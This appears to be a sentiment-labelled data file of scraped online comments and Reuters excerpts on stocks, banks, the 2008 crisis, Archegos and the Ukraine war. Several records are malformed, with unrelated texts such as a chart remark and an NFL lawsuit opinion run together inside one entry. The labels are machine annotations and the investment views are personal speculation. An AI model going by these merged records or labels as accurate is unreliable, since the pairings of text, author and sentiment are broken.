1641247953;"interesting question, but the difference isn't worth a bucket of warm pee.  the real question is why would you bother to own bank of america stock.  (i know, i know--  nomb.)  

in theory, bank of america, because its yield is taxed at a higher rate (as foreign income--  that is, at your marginal tax rate). however, the boa yield is currently only 1.89%, so if you're in a 30% tax bracket, that's only 0.57%, or $57 per ten thousand invested.

td has a higher yield (3.26%) and it's taxed as a canadian dividend, which in that bracket would be about 9% in ontario, or 0.29%, iow $29 per ten thousand.  the difference (0.28%) is $28 per ten thousand dollars invested.   could get yourself a nice pizza for that once a year i guess.";3.0;;Strix780;0.0;False;False;Positive;Positive;Neutral

1641513508;"just downloaded another copy and did a little culling. this is what i usually do every month to see if there are some things i'm interested in looking more into.

i culled all otc stock (over the counter), and then i removed anything that did not have at least a 7% dgr for 1yr, 3yr, 5yr. there is a 5yr/10yr a/d (5yr vs 10yr dgr acceleration/deceleration ratio). anything &gt;1.0 is good. this indicated that the average dgr yoy is either at least staying the same (=1.0) rising (&gt;1.0). i will copy/paste to make a 3yr/5yr as i prefer to see how it compares to those. sometimes there were some issues 5+yrs ago that didn't allow them to raise the dividend so the 5yr/10yr a/d is low but the 3yr/5yr looks great and they are raising it. i also personally like to give a little wiggle room so i look for anything that is &gt;0.9 a/d ratio for the 3yr/5yr.

doing just this in about 30 seconds i was able to see that there are approx ***138*** equities on the list. then you can just start culling through all the fundamentals. i'll start by removing things with high p/e levels, negative earnings/revenue, and negative growth and etc. typically i can get down to about 20 decent looking holdings on paper. then i'll head to seekingalpha or something, make a portfolio and then look into ratings, debt, what the share price appreciation and performance and returns have been. it's a great way to build a portfolio.

i put a good bit of time into this. also, another good way to find decent holdings is looking through $dgro $schd, and some other really high rated dividend growth stocks. they do a ton of research so their top 10 or 20 holdings are typically helpful to start with.

\*\*added - if you remove anything with &lt;2.5% yield here is the remaining 27 holdings. you'll need to look into their fundamentals but this could be something to look into.

1641840571;"k, i'm not going to run a vpn for xcloud streaming, and i almost, i mean almost, went down a rabbit hole of by passing my home3000 router for the vague promise of blowing $300 on a new wifi router and a sfp media convertor (or ubiquti router w/ sfp), when its not clear what the real issue is. 

if it's a bell route, i would hope microsoft would maybe contact bell and have them route traffic properly. netflix and everyone else is on top of the largest market isps, colocating and setting up backbone agreements. if its the home3000, and i don't know why it would be really, what am i supposed to do? replace a router that works perfectly for everything but this? i'm not using bell's tv or voip services. i disable all qos crap and i run cat6 for pretty much everything. 

my comment about the xcloud app not including any diagnostic, ping, route hoping info, etc... all stands. it doesn't even come with a basic network test. the xbox at least will test internet connectivity and remote play capability. instead supposed i'm running wireshark to figure out what's going on. if ms doesn't care, i'm not sure why i should put all this time in.

like i said, it ran well enough in june, now it doesn't. my connection currently caps out in real transfer testing at 500/500. it can serve 2 stay at home students and 2 work from home parents with vpns, yet i can't view xcloud's piddly bit rate stream.

if its a routing problem, again, why is microsoft selling in markets without tooling to detect if there are service issues? every single xcloud app could be reporting back if there are quality issues. a devops person at microsoft can simply look and reach out to isps in question to resolve the issue.

anyways. i'll go back to sleep now. i own ms stock, so you guys enjoy xcloud on me. i'll forget it exists for another 6 months then maybe check back in. maybe it'll be gone or fixed by then. who knows.";1.0;;No-Opportunity-8875;0.0;False;False;Positive;Positive;Neutral

3 part thesis:

* i began this position back in june of 2020 because it had dropped ridiculously low.  it's basically made that recovery.  i've closed several call positions ranging from -50% up to nearly +400%.

* near term strategy is the rise in interest rates.  rate sinsitivity is highest for wfc amongst peers, bank of america is also a good play for rate increases.   $wfc has run since the new year for this reason, and i believe there is still upside based on interest rates.  (earnings was not part of this strategy, but holy shit did it pay off.)  **i'm expecting another bump right before or at an actual increase.**

* long term strategy is removal of the fed imposed asset cap.  $1.9 trillion asset cap imposed in 2018 for the sales/account scandal.  the bank has made public progress toward meeting the requirements for lifting the cap, but they are not there yet.  i'm *hoping* this will be lifted q3-q4 2022, if not, i'll roll everything out to 2023 as this will provide a *serious* boost to share price.  **after the earnings call, i thinking the cap will be removed no earlier than 2023, so i'll likely start buying leaps even further out.**


i will continue to buy on any dips.

*jan 19 (reuters) - retail investors were less enthusiastic about buying the dip in u.s. stocks on tuesday, the latest sign of a possible fatigue after last year's tech-fueled trading frenzy, vanda research analysts said in a weekly note.

individual investors bought $1.6 billion in stocks on tuesday when u.s. shares sold off sharply after weak results from goldman sachs (gs.n) and a spike in u.s. bond yields.

by contrast, they had bought close to $2 billion on sept. 28 when the s&amp;p 500 fell 2%.

""retail investors bought a lot less than they typically would,"" vanda's ben onatibia and giacomo pierantoni said about tuesday's session.

""this could be the first sign that retail fatigue or capitulation is setting in, at least in the tech space.""

vanda's research note comes as enthusiasm around so-called ""meme stocks"" also appears to be fading, a year on from the gamestop corp (gme.n) frenzy when retail investors coordinated on online message boards to buy into heavily shorted stocks.

a report on friday showed young investors were losing interest in these ""meme stocks"", with gen z's attention shifting to companies in areas like electric vehicles and the ""metaverse"". read more

a large share of purchases on tuesday was concentrated in proshares ultrapro qqq (tqqq.o), a leveraged etf that targets three times the one-day return on the nasdaq 100 index (.ndx), helping cushion the blow from the massive institutional selling in the sector, vanda's analysts said.

even microsoft corp's (msft.o) bumper $68.7 billion purchase of ""call of duty"" maker activision blizzard (atvi.o), the biggest gaming industry deal in history, failed to cheer up retail investors. read more

retail investors were net sellers of activision on a day when its shares jumped 26%, the research house said.

buying in retail favorites, including tesla inc (tsla.o), apple inc (aapl.o), advanced micro devices inc (amd.o) and nvidia corp (nvda.o), has also diminished amid a tech sell-off that started last month, according to vanda research.*";2.0;;fountain-of-doubt;0.0;False;False;Positive;Neutral;Negative

sure, acquiring company stocks can take a hit from debt transfer etc from the company being acquired but because they spent 70b yesterday didn't make them drop any more significantly than the board market (on a percentage basis) or compared to similar stocks.

the transaction also didn't talk specifically about the debt absorption so i'm not sure what blizzard carried but it did include their net cash.  honestly, i think a transaction of this size was largely priced into the stock price already so i'm not expecting to see significant downward pressure on the stock price honestly.  i do hold a fairly significant portion of ms stock in my porfolio so maybe i'm being optimistic.  who knows.";2.0;;munkyxtc;0.0;False;False;Positive;Positive;Positive

1642809868;"your understanding is far better than most :) some corrections from what i remember:

the tranches used in cdos weren't just groups of mortgages, but *portions* of the mortgages. the first 20% repaid from 10,000 mortgages was put into a cdo, which basically said that once that was repaid, you get some premium over what you paid for the cdo. the 2nd 20% was similarly packaged, but you had to wait longer for it to vest, and it had a higher chance of defaulting, so the underlying investment was sold for less. but the reason this worked (for a while, and on paper) is the idea that people default at a predicable rate - 1% of subprime borrowers fail to pay off the first 20%, 5% fail the next 20%, etc. if one or ten or a hundred people suddenly go bankrupt, that's built into the price of the securities.

i think this is part of what op's video gets wrong - it definitely was not just speculative investors that caused the recession, but also very much 'high risk' mortgages (i.e., sub-prime). some notes on this...one of the biggest problems wasn't just that people *couldn't* pay back their mortgages, it was that they *shouldn't*, financially. if i borrow $300k for a home, expecting it to be $400k in a couple years, that seems like a good investment at almost any interest rate. but if suddenly that home is now worth only $150k, i have 2 options if i am not keeping the home: sell it for $150k and just pay $150k loss over however many years, or...walk away. mortgage debt was unique in that many states allowed borrowers to simply walk away, and absolve themselves of all responsibility for the loan and the house - the bank is stuck with the home whether they want it or not, and because they lent out $300k for a house now worth $150k, they are the ones stuck eating the loss. further, they never wanted to be in the business of home sales, so this becomes a huge hassle they never thought they'd need to deal with. this was complicated by the fact that because of the collateralization of the mortgages, it became very very hazy as to who actually owned the home - the loan was split into the tranches talked about above, and was part of say 5 different securities, and each of those was perhaps owned by various investment funds that knew absolutely nothing about home resale. 

the above was facilitated by failures pretty much everywhere. during clinton's term, there was a big push to make 'the american dream' available to everyone, and so the rules were such that lenders were incentivized to loan to otherwise unqualified buyers; those without a history of steady income, with few assets and no liquid capital. this allowed/incentivized lenders to lend to people with virtually $0 down payment, which made walking away from the homes a no brainer. the loan underwriters sold the loans to investment firms as you described, and the ratings agencies (which are government designated, but ostensibly private organizations) all said that while the mortgages were 'junk', the cdos created from them were aa or aaa in their stability. which makes sense without considering network effects.

i don't think cds's were put into cdo's, but one part cds's played you missed is risk requirements. banks are required to keep their 'risk' (how much they could lose due to market fluctuations) below some threshold, so if they have some number of cdo's on their books, they have to account for the chance those fail for some reason in this calculation, and it limits how much they can invest. along comes cds's, and someone says ""hey, i'm so sure that security will be fine, i'll insure it for you for a small price"". this allowed the banks to claim their risk exposure was mitigated - after all, what are the chances that both the mortgages and a large institutional insurer both default? which of course allowed them to invest more.

but wait, there's more! hedge funds also saw a chance for advancement, on the backs of the banks hardest hit. investors started to worry after lehman went under - individual funds were insured up to $100k by the fdic, but large institutional investors were not. if you had $10 million in some embattled investment bank, you were definitely wondering whether they were going to be able to provide that money back to you. people made a 'run on the bank', which further caused problems for the institutional investors. things sorta stabilized, until ultra wealthy hedge funds realized they could artificially signal the collapse of a bank by short selling. for example, morgan stanley (ms) is at $30 a share. it goes up or down a few cents each day, but stays about there. various hedge funds working in tandem want to force the price down to make clients of the bank feel their funds aren't safe. so the hedge funds borrow as much ms stock as they can get, and sell it on the market (short sale). other investors, scared of what they saw with bear and lehman, don't want to get stuck with large quantities of worthless ms stock, so after seeing the price go from $30-&gt;$29.5, they sell off their stock, just to be sure. which pushes it down to $29. more people see this, and they sell *their* stock as well. $28. a few large names get antsy, and pull their funds out of ms accounts; word of this gets out, and further frightens ms stock holders. they sell at $27. this cycle feeds in on itself. ideally for the hedge funds, ms goes under - they have to repay their stock, but if it's trading at $0.01, they made $29.99 (times a couple billion). this actually did happen, within a few hours, and led to the rules against short selling of financial institutions for some period of time.

in the end, there is enough blame to go around. lawmakers, regulators, the rating agencies, the lenders, the borrowers, the investment banks, the cds issuers, hedge funds, various businesses entering into the cds space when they had no business in that market (freddie, fannie), even large companies with high reliance on low priced credit (ford, gm)...all played a large part. saying it was just a few large banks cannibalizing the system 
is wrong.

source: worked at ms at the time; the above story happened, within a few hours. every person on my floor was just glued to finance.google.come, thinking...what happens if it goes to $0? do we just go home...? i saw when lehman went under - people were crying carrying boxes out of their building, with news crews focusing on each person as they went. ms pulled through in literally the last minute because of a large influx of cash from mufj (japanese bank). they stopped bonuses for all this period for obvious reasons, but gave out lots of stock to employees instead.";23.0;;rollie82;0.0;False;False;Negative;Positive;Positive

1643148902;"generally speaking, yes, microsoft promised to pay $69b for ab in one year. that $69b is paid out to the owners of the company. in this case, because ab is a public company, the owners are anyone who owns a share of ab. 

under this arrangement, individual shares will be converted either to cash or to shares of microsoft, depending on the arrangement of the buyout. for example, some companies pay all cash when acquiring another company, while some companies mix cash and stock, and other companies do an all stock transaction. regardless of the arrangement, if you own ab shares, the totality of all owned ab shares (aka the market cap) is now $69b minus a certain percentage due to risk of cancellation or block.

to make this easier to understand, say that abs market cap was originally $50b and that there are 1 billion shares outstanding. this means each share is worth $50. since microsoft agreed to buy ab for $69b, the total number of shares would stay the same, but each share would jump in value to $69 per share. it might only jump to $67 for now while the deal plays out, as there is a risk the deal gets cancelled or blocked. as the transaction date gets closer the $67 per share will slowly approach the buyout price ($69 per share). 

to answer your other question, mom and pop shareholders do not generally have a say in how much their shares are worth. depending on the companies ownership structure, only a certain percentage of shareholders need to sign off on an acquisition deal. so, even if you didn’t want the deal to go through, you will be overruled and your shares will be worth the agreed upon price. 

on the day of the transaction, ab stock will cease to exist and your holdings will be converted to either ms stock or cash, depending on the arrangement of the deal.

this eliminates some of the noise in the m5 and makes for a cleaner chart while still giving you the same signal. the caveat here is that the signal will be delayed but i see that as more of a feature than a hindrance as the trend is confirmed on the m5 and m15 by the time the crossover happens.

imo…the true motive for filing a class action suit was to gain access to nfl-wide related information through discovery. if the judge allows the case to proceed to discovery, we know from the kapernick case that nfl owners hate discovery, probably for very good reasons. there is doubtful any group of 32 human beings on the planet more arrogant and likely to release legally incriminating evidence in e-mails than nfl owners. they will buy flores, et. al. off at the earliest opportunity with a settlement just to stop the process. 

even if the judge dismisses the class action without discovery, flores has a great case against the giants if the belichick e-mail was genuine. it’s hard to believe belichick was careless enough to send such an e-mail after all his legal experience with deflate- and spy- gate, but he is one arrogant dude that just doesn’t believe the rules were made for him. in this case, he may have the pleasure of being interrogated by flores’s lawyers in discovery and possibly in court if it goes to trial. my guess is the giants will eventually settle for $ms to avoid a trial that publicly validated the sham nature of the interview with flores.  

it’s ironic that the giants (and possibly the nfl) are likely to pay $ms in a discrimination case that was made possible by the nfl’s modified “rooney” rule designed to prevent discrimination.  regardless, flores will likely have the “pleasure” of making the nfl and/or the giants pay dearly for their careless disregard of rules designed to promote equal opportunity for black coaches.";1.0;;Jlmcneill1955;0.0;False;False;Positive;Positive;Neutral

1645045401;"feb 16 (reuters) - morgan stanley's (ms.n) role in the collapse of archegos capital management deepened a probe by u.s. authorities into wall street's lucrative market for block trades, bloomberg news reported, citing people with knowledge of the matter.

the investment bank lost nearly $1 billion last year when bill hwang's archegos failed to meet margin calls, forcing several investment banks including morgan stanley to attempt recouping losses by liquidating shares and assets.

block trades were already under scrutiny when the highly leveraged family office imploded, the report said on wednesday.

morgan stanley, shares in which were down 2.3%, did not immediately respond to a reuters request for comment.
broker-dealers frequently buy and sell blocks of shares, either on behalf of clients or as part of a hedging strategy, which are large enough to move the company's share price.

block trading tends to increase during times of volatility as institutional investors rebalance their portfolios. information on such share sales ahead of time could be extremely valuable.

federal investigators began focusing on trades carried out by morgan stanley a day before the wider sell-off wiped out $35 billion from the value of archegos' holdings, bloomberg said.

that led to a wider inspection of multiple trades brought to market by morgan stanley, and whether its clients illegally profited from trading in advance of those transactions, according to the report.

it also led to scrutiny of pawan passi, a senior executive at the bank who spoke about various block trades, the report said.

reuters and other media outlets reported on tuesday that the u.s. securities and exchange commission (sec) was probing whether financial executives broke the rules by tipping off hedge funds ahead of large sales of shares. 

the sec subpoenaed financial institutions in recent weeks to ask about particular block trades, including some dating back to 2019, according to a source familiar with the probe.

the sweep appears aimed at the broker-dealers involved in the trades as well as protocols the firms have to prevent misuse of the information, the source said.";63.0;;kamoob666;0.0;False;False;Negative;Positive;Negative

while prosecutors haven't made any decisions yet, potential charges under the racketeer influenced and corrupt organizations act (rico) were an option on the table, the sources said.

in the past, prosecutors have built rico cases alongside other allegations, such as manipulation. one of the most high profile cases brought under the rico act included that of michael milken, who was indicted in the 1980s for racketeering and securities fraud but reached a plea deal, pleading guilty to securities violations but not racketeering or insider trading.

reuters could not ascertain which types of charges the agency was leaning toward at this stage of the investigation or whether the probe would eventually lead to charges.

spokespeople for the justice department in washington and the u.s. attorney's office in los angeles, which are involved in the probe according to the sources, declined to comment.

citron declined to comment.

a spokesperson for muddy waters did not immediately respond to a request for comment. 
 
the potential use of the 1970 law, which has not been previously reported, provides new insights into the scale and ambition of the investigation. the probe marks a new frontier for the justice department's unit in washington tasked with rooting out corporate crime.

a racketeering case could allow prosecutors to ensnare a broad swathe of investors involved in an alleged ""criminal enterprise,"" even if they participated indirectly, lawyers said. 
 
but such a case would also face more challenges than a narrower one aimed at a smaller group of people. that's in part because prosecutors have to establish a pattern of activity, they said.

among the activities the justice department is investigating is whether funds conspired to perpetrate a so-called ""short and distort scheme,"" sources have previously told reuters.

in such a scheme the funds would have placed trades that stood to profit if a company's stock fell and then issued false or misleading negative research reports about the company. 
 
prosecutors are also investigating the relationships between the short-sellers who publish the reports and hedge funds and other investors that may have profited, the sources have said.

they are examining whether there is coordinated trading designed to boost trading volumes and exaggerate price drops on news of the short reports, reuters previously reported.

rico charges have historically been used to combat bribery, money laundering, or drug trafficking conducted by organized criminal enterprises such as the mafia. they are unusual in the world of finance but not unprecedented. 
 
u.s. prosecutors in 2019 charged then-current and former jpmorgan chase &amp; co (jpm.n) executives with racketeering and manipulating prices of precious metals.

""rico statutes haven’t been used in this realm often in recent years, but they aren’t limited to organized crime,"" robert frenchman of mukasey frenchman llp in new york said. ""it’s certainly in the prosecutors’ toolbox."".

1645730274;"there are a lot of different segments to the semiconductor industry. generally you can separate them into three types of companies:

1. manufacturers. these are the companies that actually make the microchip devices: intel, samsung, micron, sk hynix, tsmc, etc. for top of the line, the industry has consolidated so that the the most advanced technologies are pretty much limited to the companies i just listed. there are a lot of chinese companies trying to catch up, but they're still several years behind, and are hampered by import restrictions as well. as you go to less state of the art, there are still a lot of companies working in larger features and on 200mm wafers, etc. these are things like analog devices, rf, etc, power, etc. are in this area. there is also a small niche in defense applications as well, since the us does not allow certain chips and technologies used in manufacturing advanced armaments (guided missiles, fighter aircraft, etc.) to be manufactured outside of the us. raytheon is a good example of this.  
work for these companies can depend a lot on where you are. working at a fab for their current production line can be stressful with long hours, because any delay or decrease in production means immediate revenue loss for the company. working on development of future nodes can be slightly less so, but you can still expect stringent deadlines and lots of stress to deliver on time.
2. tool suppliers. these are the companies that make the tools (i.e. giant machines worth $ms each) used in the high-volume manufacturing process. their customers will be the manufacturers listed above. some of these are really big companies with $bs in yearly revenue, but unless you're in the industry a lot of people have never heard of them. asml, applied materials, tokyo electron, lam research, and kla tencor are some of the bigger companies here.  
one of the difficulties of working for these companies is that their entire bottom line is determined by a few customers (i.e. the above companies) and possibly just a few hundred actual tools. so when the manufacturers stop expanding and buying new tools, the tool suppliers can suddenly see their entire revenue stream dry up.
3. material suppliers. these are the companies that manufacture and sell consumable items used in the manufacturing process. bulk chemicals, specialty chemicals, wafers, gases, etc. the purity requirements for the semiconductor industry can be absolutely insane, now &lt; 1ppb (part per billion) in some applications. this requires companies that have very specialized purification and metrology techniques to be able to fit these stringent requirements.  
margins and profits aren't nearly as high in this sector as it is for the tool suppliers, but it's a lot safer as well: whether the manufacturers are buying new tools or not, they are always going to be buying wafers and chemicals for current production, since their revenue is directly dependent on how many chips they are able to make.

in general it's important to understand the cyclical nature of the industry. it goes from boom to bust and back to boom again. the industry has been on a big boom cycle for the past several years, but it never lasts forever. when production outstrips demand, the price of chips crashes, the manufacturers see their profits drop precipitously, the tool manufacturers see all their future orders cancelled and all their revenue predictions dry up, and the whole industry has to tighten their belts and hopefully wait out the downturn.

different companies handle the downturns different ways. some will just go through fire/hire waves, while others will keep a lot of money in the bank to ride out the downturns. i've also seen a large increase in the use of contractors or temp labor that can be much more easily let go when needed.";13.0;;derioderio;0.0;False;False;Positive;Positive;Positive

feb 25 (reuters) - credit suisse group ag (csgn.s) is trying to help the u.s. department of justice potentially build a case related to block trading against rivals morgan stanley (ms.n) and goldman sachs group inc (gs.n), bloomberg news reported on friday.

the swiss bank's push to provide assistance apparently goes beyond banks’ routine cooperation with requests for information, the report said, citing people familiar with the matter.

credit suisse has delivered a presentation to the u.s. attorney's office for the southern district of new york, flagging potential issues with the collapse of archegos capital management last year that led to billions of dollars of losses for global banks, according to the report. 

a representative for credit suisse declined to comment. 

the archegos meltdown drew regulatory scrutiny towards block trading, which refers to the practice of buying and selling blocks of shares. broker-dealers engage in block trading, either on behalf of clients or as part of a hedging strategy.
reuters reported last week that the u.s. securities and exchange commission was probing whether financial executives may have broken the rules by tipping off hedge funds ahead of such trades.

in a filing on thursday, morgan stanley (ms.n) said regulators and prosecutors in the united states were probing various aspects of its block-trading business. read more

washington, feb 27 (reuters) - u.s. banks are preparing for retaliatory cyber attacks after western nations slapped a raft of stringent sanctions on russia for invading ukraine, cyber experts and executives said.

tensions between russia and the west escalated on saturday as the united states and its allies moved to block some russian banks from the swift international payment system and placed curbs on the russian central bank's international reserves.

western governments have warned for weeks that the tensions could spark massive cyber attacks from russia or its supporters. some executives said the latest measures may be the trigger.

“there will be some retaliatory measures taken by them, and i think in the least costly way that they can do it - that means some kind of cyber attack,"" said steven schweitzer, senior fixed income portfolio manager at the swarthmore group in new york.

global banks, already top targets for cyber attacks in peacetime, are increasing network monitoring, drilling for cyber attack scenarios, searching their networks for threats and lining up extra staff in case hostile activity surges, according to cyber security experts.

among the threats they are preparing for: ransomware and malware attacks; denial-of-service attacks that take down websites; and data wiping and theft, possibly simultaneously.

“banks are incredibly prepared. they have taken out their playbooks and it's practice, practice, practice,"" said valerie abend, who leads accenture's global financial services security group.

the largest u.s. banks, jpmorgan chase &amp; co (jpm.n), citigroup inc (c.n), bank of america corp (bac.n), wells fargo &amp; co , morgan stanley (ms.n) and goldman sachs group inc (gs.n), either did not respond to requests for comment or declined to discuss their cybersecurity plans.

as guardians of critical national financial infrastructure, global banks are subject to strict operational risk rules and have some of the highest cyber security standards in corporate america, according to cyber experts.

the industry regularly plans for attacks and completed a massive, system-wide ransomware drill in november, according to the securities industry and financial markets association, which led the exercise.

leading up to the invasion, there has been a more concerted industry effort to ensure banks' incident responders are on high alert and that they had increased monitoring, abend said.

the new york department of financial services and the u.s. cybersecurity and infrastructure security agency have warned private companies to be vigilant for cyber threats.

""we wouldn't be doing our due diligence if we weren't preparing for that,"" said teresa walsh, global head of intelligence at the financial services information sharing and analysis center, an international group of institutions that share cyber intelligence.

“right now, they've been warning in generalities - just be prepared. we are trying to put some more specificity to it,"" walsh added.

walsh said banks have been brainstorming risk scenarios based on tactics russian hackers have used in the past. the 2020 solarwinds corp (swi.n)software breach that gave hackers access to hundreds of companies using its products, is top of mind.

that has increased lenders' focus on third-party providers such as big cloud and software-as-a-service firms. while banks themselves have big it budgets and strict compliance programs, if such providers are hacked their data could be exposed.

banks are urging such partners to ensure they have the right security protocols, according to walsh and abend.

they are also ""threat hunting,"" searching for known malicious behaviors inside bank it systems, examining potential vulnerabilities and testing anything they had to recently patch, walsh said.

now i'm not sure they closed a short position as wouldn't that mean they'd filed a buy first? yesterday we saw a sell filed which doesn't specify the amount of shares sold. the info on their short position including number of shares is [here](https://www.reddit.com/r/cenn/comments/rqix9o/old_info_blackstone_still_openly_shorting_nakd/?utm_medium=android_app&amp;utm_source=share) and can be seen as neither green or red on fintel. currently i can't see their short position on fintel but it doesn't go that far back for a free view. either way i know they've done this before last year by getting in on a short position, closing it with a sell off (?), and then coming back in later.

of the 8 the profitable trades. 4 trades were closed early ($rrc cds, $rcl pds, $ual pds, $trip pds) that could have been closed for maximum profit. the remaining 4 trades were closed extremely close to maximum profit to generate funds for additional trades.

&gt;it's clear that most people don't want to return to the office either because of the commute or factors related to the office itself that they don't like

i don't understand the purpose of you explaining something to me after i just stated the following:  *commuting sucks. paying tolls and train tickets suck. none of this is deniable.*

do you disagree with any of the following conclusions?

* wfh is a game changer and a positive benefit to nearly every individual that was afforded the opportunity to do so.  at the individual level it was a slam dunk.
* when fewer people from outside the city (commuters and tourists) spend less in the city, that will have a negative economic impact.
* the city is incentivized to push for return to office for this reason.
* there are coherent reasons for wanting people back to work beyond just doing it for real estate developers or wall street.
* upscale professionals that work in tech, finance or jobs that can thrive in a virtual environment are more immune to the negative consequences than restaurant workers, cab drivers, teachers and others who can't.  
* rich business owners came out of covid *wealthier* then they went into it.  goldman sachs, jpm stock are worth more *now* than before covid.  demonstrating that return to office isn't exactly about making wall street - they can get rich in any work environment.

lviv, ukraine/antalya, turkey, march 10 (reuters) - talks between ukraine and russia's foreign ministers on thursday failed to bring any respite in the conflict as hundreds of thousands of civilians remained trapped in ukrainian cities sheltering from russian air raids and shelling.  
with russian president vladimir putin's war in ukraine entering its third week, officials in mariupol said russian warplanes again bombed the southern port city where a maternity hospital was pulverised on wednesday.  
putin, facing global condemnation for the assault and increasingly isolated, said russia would emerge stronger after overcoming the difficulties caused by economic sanctions.  
he told a government meeting there had been no alternative to what russia calls its special military operation in ukraine.  
""there are some questions, problems and difficulties but in the past we have overcome them and we will overcome them,"" he said.  
however, the invasion has so far failed to reach its stated objectives but has caused thousands of deaths and forced more than two million people to flee the country, while several cities are under siege.  
the british government blacklisted more russian oligarchs on thursday, including britain's best-known, roman abramovich, owner of chelsea soccer team.  
no breakthrough  
russian foreign minister sergei lavrov and ukraine's dmytro kuleba met in turkey in the highest-level talks since putin ordered the invasion on feb. 24.  
kuleba said afterwards that lavrov had refused to promise to hold fire to allow for the distribution of aid and for the evacuation along humanitarian corridors of hundreds of thousands of civilians trapped in mariupol and elsewhere.  
lavrov showed no sign of making any concessions, saying the operation was going to plan and repeating moscow's accusations that ukraine posed a threat to russia.  
a ceasefire was not meant to be on the agenda at thursday's talks in antalya, lavrov added.  
aid agencies say humanitarian help is most urgently needed in mariupol, where residents are running out of food, water and power. its capture would allow russia to link up pro-moscow enclaves in the east and russian-annexed crimea to the south.  
attempts to send aid and evacuation convoys have failed for six days.  
russian warplanes targeted convoy routes on thursday, said petro andrushenko, an adviser to mariupol's mayor.  
""air strikes started from the early morning. air strike after air strike. all the historic centre is under bombardment,"" he told reuters by phone.  
""they want to absolutely delete our city, delete our people. they want to stop any evacuation.""  
lavrov said the hospital struck on wednesday had stopped treating patients and had been occupied by ukrainian ""radicals"".  
russia's defence ministry later denied having bombed the hospital, accusing ukraine of a ""staged provocation"" there.  
in brussels, european commission president ursula von der leyen said the hospital attack could constitute a war crime and should be investigated, calling it ""inhumane, cruel and tragic"".  
lavrov accused western countries of inflaming the situation by arming ukraine.  
asked if the conflict could lead to nuclear war, he said: ""i don't want to believe, and i do not believe, that a nuclear war could start.""  
russia says its offensive is aimed at disarming its neighbour and dislodging leaders it calls neo-nazis. kyiv and its western allies say this is a baseless pretext to invade a democratic country of 44 million people.  
but so far russian forces have failed to crush ukraine's military, while zelenskiy - still in the capital kyiv - has rallied his people and western military aid has poured across the polish and romanian borders.  
russian troops have advanced in the south but have yet to capture a city in the north or east. western countries believe that after a planned lightning strike on kyiv failed in the early days of the war, moscow has turned to tactics involving far more destructive assaults.  
britain said on thursday a russian column northwest of kyiv had made little progress in over a week and was suffering losses.  
in washington, cia (central intelligence agency) director william burns said putin did not appear to have a ""sustainable"" end-game in ukraine and might soon try to find a way to end the fighting.  
meanwhile, the western-led sanctions designed to cut off the russian economy and government from international markets have bitten hard, with the rouble plunging. read more  
goldman sachs group inc (gs.n) said on thursday it was closing its russian business - the first major u.s. bank to exit. it follows decisions by such emblematic global brands as mcdonald's, starbucks and coca-cola to halt business in russia.  
'barbaric'  
the pounding of mariupol underscored u.s. warnings that the biggest assault on a european state since 1945 could become increasingly attritional after russia's early setbacks.  
russia has repeatedly pledged since saturday to halt firing so at least some trapped civilians could escape mariupol. both sides have blamed the other for the failure of the evacuations.  
half of the more than 2 million total refugees from ukraine are children. the international committee of the red cross said houses had been destroyed all across ukraine.  
survivors of the worst-hit cities are among the refugees, many suffering physical injuries and psychological trauma.  
at the polish border, valera, a carpenter in his 50s, looked on nervously as his daughter anna, 24, was borne on a stretcher.  
it was two days since they had left the eastern city of kharkiv, where anna, who has cerebral palsy, broke her leg as they ran to a bomb shelter.  
""there is positional fighting during the day, air raids in the evenings, they are shelling from everything, fighter aircraft,"" he said. ""the centre (of kharkiv) is ruined, the outskirts have already been bombed.""  
he was one of few men to cross from ukraine as those of conscription age are generally obliged to stay.  
zelenskiy's chief economic adviser said russian forces had so far destroyed at least $100 billion worth of ukrainian infrastructure, buildings and other physical assets.

1647388099;"march 15 (reuters) - global commodities trader trafigura group has been holding talks with private equity groups to secure additional financing as soaring prices trigger margin calls across the commodities industry, bloomberg news reported on tuesday.

trafigura faced margin calls in the billions of dollars last week, the report said, citing people familiar with the matter.

the increased margin calls – essentially requests to deposit extra funds with brokers – come amid supercharged volatility in raw materials prices after the invasion of ukraine by commodities-export giant russia sparked sanctions from the united states and it allies.

trafigura had held talks with blackstone inc (bx.n) for an investment of around $2 billion to $3 billion in preference shares or a similar hybrid instrument, the report said, adding that the talks, however, failed and no deal was made.

blackstone declined a reuters request for comment.

the report also said trafigura approached apollo global management inc (apo.n), blackrock inc (blk.n) and kkr &amp; co (kkr.n) to seek new funding.

""as part of a longer-term strategy to diversify our sources of finance, we have been building relationships with alternative providers of capital,"" trafigura said in an emailed statement to reuters. ""we regularly engage with alternative capital providers on debt and equity opportunities across the business.""

apollo, kkr and blackrock also declined to comment.

earlier this month, trafigura said it raised a $1.2 billion revolving credit facility from a consortium of banks to increase its financing pool in order to handle soaring energy and commodity prices.";22.0;;--GrinAndBearIt--;0.0;False;False;Positive;Negative;Negative

blackrock inc's (blk.n) chief executive, larry fink, said on thursday that the russia-ukraine war could end up accelerating digital currencies as a tool to settle international transactions, as the conflict upends the globalization drive of the last three decades.

in a letter to the shareholders of the world's largest asset manager, fink said the war will push countries to reassess currency dependencies, and that blackrock was studying digital currencies and stablecoins due to increased client interest.

""a global digital payment system, thoughtfully designed, can enhance the settlement of international transactions while reducing the risk of money laundering and corruption"", he said.

that appeared to strike a different tone from may of last year, when fink raised some concerns around volatility and said it was too early to determine whether cryptocurrencies were just a speculative trading tool. read more

in the letter on thursday, the chairman and ceo of the $10 trillion asset manager said the russia-ukraine crisis had put an end to the globalization forces at work over the past 30 years.

access to global capital markets was a ""privilege, not a right,"" he said, adding blackrock had suspended the purchase of any russian securities in its active index portfolios following moscow's invasion of ukraine.

""over the past few weeks, i’ve spoken to countless stakeholders, including our clients and employees, who are all looking to understand what could be done to prevent capital from being deployed to russia. we believe this is the definition of our fiduciary duty,"" fink said.

blackrock inc's total client exposure to russia had declined to less than $1 billion earlier this month from $18 billion before moscow's invasion of ukraine led to western sanctions and the closure of the russian stock market, according to figures supplied by the asset manager this month. read more

russia calls its actions in ukraine a “special operation.”

the conflict's impact on global supply chains - already hammered over the past two years because of the coronavirus crisis - is expected to contribute to inflationary pressures that are pushing global central banks to tighten monetary policies and reverse covid-19-driven accommodative measures.

""while companies’ and consumers’ balance sheets are strong today, giving them more of a cushion to weather these difficulties, a large-scale reorientation of supply chains will inherently be inflationary,"" said fink.

he said central banks were dealing with a dilemma they had not faced in decades, having to choose between living with high inflation or slowing economic activity to contain price pressures.

energy prices have jumped as sanctions on moscow prompted companies and countries to reassess supply chains and to try to reduce dependence on russian commodities.

""energy security has joined the energy transition as a top global priority,"" fink said.";2.0;;Jxntb733;0.0;False;False;Positive;Positive;Positive

